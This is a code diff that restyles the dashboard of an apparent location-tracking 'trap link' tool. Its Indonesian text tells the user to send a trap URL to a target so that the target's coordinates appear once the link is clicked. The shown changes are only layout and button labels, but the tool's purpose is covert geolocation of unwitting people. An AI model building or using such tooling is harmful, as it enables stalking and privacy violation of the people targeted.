@@ -461,15 +461,19 @@
                     <p style="font-size:0.9rem; color:var(--text-dim);">Kirim URL jebakan di bawah ini ke target. Jangan
                         tutup halaman ini, kalo diklik koordinat akan muncul otomatis!</p>
 
-                    <div style="display:flex; gap:10px; margin-bottom: 1.5rem;">
-                        <div class="trap-linkbox" id="displayTrapLink" onclick="copyTrapLink()"
-                            style="cursor:pointer; flex: 1; margin: 0;" title="Klik Untuk Copy"></div>
+                    <div class="trap-linkbox" id="displayTrapLink" onclick="copyTrapLink()"
+                        style="cursor:pointer; width: 100%; box-sizing: border-box; margin-bottom: 15px;"
+                        title="Klik Untuk Copy"></div>
+
+                    <div style="display:flex; justify-content:center; gap:15px; margin-bottom: 2rem;">
                         <button onclick="shareDashboard()" title="Bagikan Dashboard ke Teman"
-                            style="background: rgba(0,240,255,0.2); color: var(--primary); border: 1px solid var(--primary); border-radius: 8px; cursor: pointer; padding: 0 15px; font-weight: bold;"><i
-                                data-lucide="share-2"></i></button>
+                            style="flex: 1; background: rgba(0,240,255,0.1); color: var(--primary); border: 1px solid var(--primary); border-radius: 8px; cursor: pointer; padding: 12px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 8px;">
+                            <i data-lucide="share-2" style="width:18px;"></i> Mabar (Share)
+                        </button>
                         <button onclick="resetTracker()" title="Stop & Reset"
-                            style="background: rgba(255,0,85,0.2); color: var(--accent); border: 1px solid var(--accent); border-radius: 8px; cursor: pointer; padding: 0 15px; font-weight: bold;"><i
-                                data-lucide="power-off"></i></button>
+                            style="flex: 1; background: rgba(255,0,85,0.1); color: var(--accent); border: 1px solid var(--accent); border-radius: 8px; cursor: pointer; padding: 12px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 8px;">
+                            <i data-lucide="power-off" style="width:18px;"></i> Berhenti
+                        </button>
                     </div>
 
                     <div id="logsContainer">
